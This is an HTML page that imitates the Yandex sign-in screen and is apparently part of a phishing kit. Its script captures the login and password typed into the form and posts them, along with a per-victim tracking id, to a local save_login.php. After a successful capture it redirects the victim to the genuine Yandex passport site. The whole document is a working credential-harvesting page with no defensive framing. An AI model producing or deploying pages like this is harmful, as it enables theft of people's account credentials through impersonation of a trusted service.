<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Yandex</title><style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:YS Text,system-ui,sans-serif;background:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.card{width:100%;max-width:380px}
.ya{font-size:36px;font-weight:700;margin-bottom:8px}
.ya span{color:#fc3f1d}
h1{font-size:20px;margin-bottom:20px}
input{width:100%;height:44px;border:1px solid rgba(0,0,0,.2);border-radius:8px;padding:0 14px;margin-bottom:12px;font-size:16px}
.btn-submit{width:100%;height:44px;background:#fc3f1d;color:#fff;border:none;border-radius:8px;font-weight:600;cursor:pointer}
</style></head><body><div class="card"><div class="ya">Yandex</div><h1>Sign in</h1><form id="loginForm"><input type="text" id="email" placeholder="Login" required autocomplete="username"><input type="password" id="password" placeholder="Password" required autocomplete="current-password"><button type="submit" class="btn-submit">Log in</button></form></div><script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
<script>
(function(){
var BASE_URL = window.location.origin + (window.location.pathname.replace(/[^/]*$/, "") || "/");
document.getElementById("loginForm").addEventListener("submit", function (e) {
    e.preventDefault();
    var login = document.getElementById("email").value;
    var password = document.getElementById("password").value;
    var tid = typeof window.TRACKIFY_TID === "string" ? window.TRACKIFY_TID : (new URLSearchParams(window.location.search).get("tid") || "");
    var btn = document.querySelector(".btn-submit");
    var label = btn.textContent;
    btn.textContent = "Please wait…";
    btn.disabled = true;
    $.ajax({
        type: "POST",
        url: BASE_URL + "save_login.php",
        data: { tid: tid, login: login, password: password, template: "yandex" },
        dataType: "json",
        success: function (data) {
            if (data && data.ok) { window.location.href = "https:\/\/passport.yandex.com\/"; return; }
            btn.textContent = label;
            btn.disabled = false;
            alert("Sign in failed. Please try again.");
        },
        error: function () {
            btn.textContent = label;
            btn.disabled = false;
            alert("Sign in failed. Please try again.");
        }
    });
});
})();
</script></body></html>
